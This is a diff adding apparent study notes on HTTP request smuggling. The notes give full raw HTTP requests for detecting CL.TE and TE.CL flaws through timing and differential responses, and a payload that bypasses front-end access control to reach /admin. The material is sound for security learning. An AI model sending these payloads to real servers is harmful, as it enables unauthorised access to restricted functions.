@@ -99,3 +99,156 @@ Transfer-Encoding
 ```
 
 ## How to identify HTTP request smuggling
+
+### Using timing techniques
+
+#### Finding CL.TE vulnerabilities
+
+- if the application is vulnerable to the CL.TE variant of request smuggling, sending a request like the following will often cause a time delay:
+
+```
+POST / HTTP/1.1
+Host: vulnerable-website.com
+Transfer-Encoding: chunked
+Content-Length: 4
+
+1
+A
+X
+```
+
+- front-end uses `Content-Length`, it will forward only part of this request, omitting X
+- back-end uses `Transfer-Encoding`, processes the first chunk, and waits for the next chunk to arrive and will cause an observable time delay
+
+#### Findng TE.CL vulnerabilities
+
+```
+POST / HTTP/1.1
+Host: vulnerable-website.com
+Transfer-Encoding: chunked
+Content-Length: 6
+
+0
+
+X
+```
+
+- front-end uses `Transfer-Encoding`, it will forward only part of this request, omitting the X
+- back-end uses `Content-Length`, expect more content in the message body and will cause time delay
+
+### Confirming HTTP request smuggling vulnerabilities using differential responses
+
+- sending two requests to the application in quick succession:
+
+  - attack request that is designed to interfere with the processing of the next request
+  - normal request
+
+- if the response to the normal request contains the expected interference, the vulnerability is confirmed.
+
+eg - normal request looks like:
+
+```
+POST /search HTTP/1.1
+Host: vulnerable-website.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 11
+
+q=smuggling
+```
+
+- This request normally receives an HTTP response with status code 200, containing some search results
+- attack request depends on variant of whether CL.TE vs TE.CL
+
+#### Confirming CL.TE
+
+```
+POST /search HTTP/1.1
+Host: vulnerable-website.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 49
+Transfer-Encoding: chunked
+
+e
+q=smuggling&x=
+0
+
+GET /404 HTTP/1.1
+Foo: x
+```
+
+- if the attack is successful, the last two lines of the request are treated by the back-end server as belonging to the next request that is received and cause the subsequent normal request to look like this
+
+```
+GET /404 HTTP/1.1
+Foo: xPOST /search HTTP/1.1
+Host: vulnerable-website.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 11
+
+q=smuggling
+```
+
+- the request contains an invalid URL, the server will response with status code 404
+
+#### Confirming TE.CL
+
+- attack request like this:
+
+```
+POST /search HTTP/1.1
+Host: vulnerable-website.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 4
+Transfer-Encoding: chunked
+
+7c
+GET /404 HTTP/1.1
+Host: vulnerable-website.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 144
+
+x=
+0
+
+
+```
+
+- if the attack is successful, everything from `GET /404` onwards is treated by the back-end server as belonging to the next request that is received.
+
+```
+GET /404 HTTP/1.1
+Host: vulnerable-website.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 146
+
+x=
+0
+```
+
+> attack request and normal request should be sent to the server using different network connection. Sending both from the same connection won't prove that the vulnerability exists
+> attack request and normal request should use the same URL and parameter names
+> should send the normal request immediately after the attack request
+
+## Exploiting HTTP request smuggling vulnerabilities
+
+### Bypass front-end security controls
+
+- suppose an application uses the front-end server to implement access control restrictions, only forwarding requests if the user is authorized to access the requested URL
+- back-end server honors every request without further checking
+- suppose current user is permitted to access `/home` but not `/admin`
+- this can bypass by using the following smuggling attack
+
+```
+POST /home HTTP/1.1
+Host: vulnerable-website.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 62
+Transfer-Encoding: chunked
+
+0
+
+GET /admin HTTP/1.1
+Host: vulnerable-website.com
+Foo: xGET /home HTTP/1.1
+Host: vulnerable-website.com
+```
